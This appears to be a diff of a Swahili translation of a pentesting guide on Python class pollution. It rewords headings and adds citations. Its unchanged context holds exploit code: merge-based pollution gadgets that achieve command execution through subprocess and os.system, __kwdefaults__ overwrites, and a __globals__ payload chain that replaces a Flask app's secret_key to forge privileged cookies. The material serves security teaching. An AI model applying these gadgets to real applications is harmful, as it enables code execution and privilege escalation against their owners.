@@ -4,7 +4,7 @@
 
 ## Mfano wa Msingi
 
-Angalia jinsi inavyowezekana kuchafua madarasa ya vitu kwa kutumia nyuzi:
+Angalia jinsi inavyowezekana kuchafua classes za objects kwa strings:<sup>[[1]](#references)</sup>
 ```python
 class Company: pass
 class Developer(Company): pass
@@ -28,7 +28,7 @@ e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'
 print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
 print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
 ```
-## Mfano wa Msingi wa Uthibitisho
+## Mfano wa Msingi wa Udhaifu
 ```python
 # Initial state
 class Employee: pass
@@ -61,11 +61,11 @@ USER_INPUT = {
 merge(USER_INPUT, emp)
 print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
 ```
-## Mfano wa Gadget
+## Mifano ya Gadget
 
 <details>
 
-<summary>Kuunda thamani ya chaguo la mali ya darasa kwa RCE (subprocess)</summary>
+<summary>Kuunda default value ya class property kwa RCE (subprocess)</summary><sup>[[1]](#references)</sup>
 ```python
 from os import popen
 class Employee: pass # Creating an empty class
@@ -116,7 +116,7 @@ print(system_admin_emp.execute_command())
 
 <details>
 
-<summary>Kuchafua madarasa mengine na vigezo vya ulimwengu kupitia <code>globals</code></summary>
+<summary>Kuchafua classes nyingine na vars za global kupitia <code>globals</code></summary><sup>[[1]](#references)</sup>
 ```python
 def merge(src, dst):
 # Recursive merge function
@@ -148,7 +148,7 @@ print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
 
 <details>
 
-<summary>Utendaji wa subprocess wa kiholela</summary>
+<summary>Utekelezaji wa subprocess kiholela</summary><sup>[[1]](#references)</sup>
 ```python
 import subprocess, json
 
@@ -180,9 +180,9 @@ subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
 
 <details>
 
-<summary>Kupitia <strong><code>__kwdefaults__</code></strong></summary>
+<summary>Kuandika juu ya <strong><code>__kwdefaults__</code></strong></summary>
 
-**`__kwdefaults__`** ni sifa maalum ya kazi zote, kulingana na [nyaraka](https://docs.python.org/3/library/inspect.html) za Python, ni “ramani ya thamani zozote za msingi kwa **parameta-za-neno pekee**”. Kuingilia kati sifa hii kunatuwezesha kudhibiti thamani za msingi za parameta-za-neno pekee za kazi, hizi ni parameta za kazi zinazokuja baada ya \* au \*args.
+**`__kwdefaults__`** ni attribute maalum ya functions zote, kulingana na [documentation](https://docs.python.org/3/library/inspect.html) ya Python, ni “mapping ya thamani zozote za default za parameters za **keyword-only**”. Kuchafua attribute hii hutuwezesha kudhibiti thamani za default za parameters za keyword-only za function, ambazo ni parameters za function zinazokuja baada ya \* au \*args.<sup>[[1]](#references)</sup>
 ```python
 from os import system
 import json
@@ -223,33 +223,34 @@ execute() #> Executing echo Polluted
 
 <details>
 
-<summary>Kufuta siri ya Flask kati ya faili</summary>
+<summary>Kuandika upya secret ya Flask kati ya files</summary>
 
-Hivyo, ikiwa unaweza kufanya uchafuzi wa darasa juu ya kitu kilichofafanuliwa katika faili kuu ya python ya wavuti lakini **ambayo darasa lake limefafanuliwa katika faili tofauti** na ile kuu. Kwa sababu ili kufikia \_\_globals\_\_ katika payloads zilizopita unahitaji kufikia darasa la kitu au mbinu za darasa, utaweza **kufikia globals katika faili hiyo, lakini si katika ile kuu**. \
-Kwa hivyo, **hutaweza kufikia kitu cha ulimwengu cha Flask app** ambacho kilifafanua **funguo ya siri** katika ukurasa kuu:
+Kwa hiyo, ikiwa unaweza kufanya class pollution kwenye object iliyofafanuliwa katika file kuu ya python ya web lakini **ambayo class yake imefafanuliwa katika file tofauti** na ile kuu. Kwa sababu ili kufikia \_\_globals\_\_ katika payloads zilizotangulia unahitaji kufikia class ya object au methods za class hiyo, utaweza **kufikia globals katika file hiyo, lakini si katika file kuu**. \
+Kwa hiyo, **hutaweza kufikia global object ya Flask app** iliyofafanua **secret key** katika ukurasa mkuu:<sup>[[1]](#references)</sup>
 ```python
 app = Flask(__name__, template_folder='templates')
 app.secret_key = '(:secret:)'
 ```
-Katika hali hii unahitaji kifaa cha kupita faili ili kufikia faili kuu ili **kupata kitu cha ulimwengu `app.secret_key`** kubadilisha funguo za siri za Flask na kuwa na uwezo wa [**kuinua mamlaka** ukijua funguo hii](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
+Katika hali hii unahitaji gadget ya kupitia faili ili kufikia faili kuu na **kufikia global object `app.secret_key`** ili kubadilisha secret key ya Flask na kuweza [**kuongeza privileges** ukijua key hii](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
 
-Malipo kama haya [kutoka kwa andiko hili](https://ctftime.org/writeup/36082):
+Payload kama huu [kutoka kwenye writeup hii](https://ctftime.org/writeup/36082):<sup>[[2]](#references)</sup>
 ```python
 __init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
 ```
-Tumia payload hii kubadilisha **`app.secret_key`** (jina katika programu yako linaweza kuwa tofauti) ili uweze kusaini vidakuzi vya flask vipya na vya ruhusa zaidi.
+Tumia payload hii **kubadilisha `app.secret_key`** (jina katika app yako linaweza kuwa tofauti) ili uweze kusaini Flask cookies mpya zenye privileges zaidi.
 
 </details>
 
-Angalia pia ukurasa ufuatao kwa vifaa vya kusoma pekee:
+Angalia pia ukurasa ufuatao kwa gadgets zaidi za read-only:
 
 
 {{#ref}}
 python-internal-read-gadgets.md
 {{#endref}}
 
-## Marejeo
+## Marejeleo
 
-- [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
+- [1] [Prototype Pollution in Python](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
+- [2] [CTFtime - idekCTF 2022: task manager writeup](https://ctftime.org/writeup/36082)
 
 {{#include ../../banners/hacktricks-training.md}}
